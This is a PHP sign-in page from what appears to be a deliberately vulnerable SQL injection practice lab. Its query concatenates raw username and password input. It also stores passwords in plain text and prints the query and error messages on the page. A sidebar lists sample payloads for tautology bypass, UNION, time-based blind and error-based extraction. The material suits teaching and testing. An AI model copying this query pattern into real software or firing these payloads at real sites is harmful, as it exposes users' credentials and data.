<?php
include __DIR__ . '/../db-connection.php';

$message = "";
$sql = "";

try {
  if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
    $result = $conn->query($sql);

    if ($result && $result->num_rows > 0) {
      $message .= "<pre>";

      while ($row = $result->fetch_assoc()) {
        $message .= print_r($row, true);
        $message .= "\n" . str_repeat("-", 30) . "\n";
      }

      $message .= "</pre>";
    } else {
      $message = "Incorrect username or password.";
    }
  }
} catch (Exception $e) {
  error_log($e->getMessage());
  $message = $e->getMessage();
} finally {
  if (isset($result) && $result instanceof mysqli_result) {
    $result->free();
  }
}

?>

<!doctype html>
<html lang="en" data-bs-theme="dark">

<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="description" content="" />
  <meta name="generator" content="Astro v5.13.2" />
  <title>Signin Template · Bootstrap v5.3</title>
  <link href="../assets/bootstrap.min.css" rel="stylesheet" />
  <link href="../assets/sign-in.css" rel="stylesheet" />
</head>

<body>
  <?php include __DIR__ . '/../includes/nav.php'; ?>
  <div class="container-fluid">
    <div class="row vh-100 py-5">
      <div class="col-5 bg-dark text-white">
        <form method="POST" action="">
          <h4 class="h4 mb-3 fw-normal text-success-emphasis">Please sign in</h4>
          <div class="form-floating">
            <input
              type="text"
              class="form-control"
              id="floatingInput"
              name="username"
              placeholder="username" />
            <label for="floatingInput">Username</label>
          </div>
          <div class="form-floating">
            <input
              type="text"
              class="form-control"
              id="floatingPassword"
              name="password"
              placeholder="Password" />
            <label for="floatingPassword">Password</label>
          </div>
          <div class="form-check text-start my-3">
            <input
              class="form-check-input"
              type="checkbox"
              value="remember-me"
              id="checkDefault" />
            <label class="form-check-label" for="checkDefault">
              Remember me
            </label>
          </div>
          <button class="btn btn-primary w-100 py-2" type="submit">
            Sign in
          </button>
        </form>
        <div class="my-5">

          <ul class="list-group list-group-flush">
            <li class="list-group-item text-warning-emphasis">Example</li>
            <li class="list-group-item">in password ' or '1' = '1</li>
            <li class="list-group-item">' or '1' = '1' or '</li>
            <li class="list-group-item">' union select 1, version(), user() -- '</li>
            <li class="list-group-item">' OR IF( (SELECT substr(database(),1,1))='a', SLEEP(2), 0 ) -- </li>
            <li class="list-group-item">' AND updatexml(1, concat(0x3a, (SELECT password FROM users LIMIT 1)), 1) -- </li>
          </ul>
        </div>
      </div>
      <div class="col-auto d-flex justify-content-center">
        <div class="vr"></div>
      </div>
      <div class="col">
        <div class="card">
          <div class="card-header text-info-emphasis">
            SQL
          </div>
          <div class="card-body">
            <p class="card-text">
              <?php echo $sql; ?>
            </p>
          </div>
        </div>
        <div class="card mt-5">
          <div class="card-header text-info-emphasis">
            Message
          </div>

          <div class="card-body">
            <p class="card-text">
              <?php echo $message; ?>
            </p>
          </div>
        </div>
      </div>
    </div>
  </div>
</body>

</html>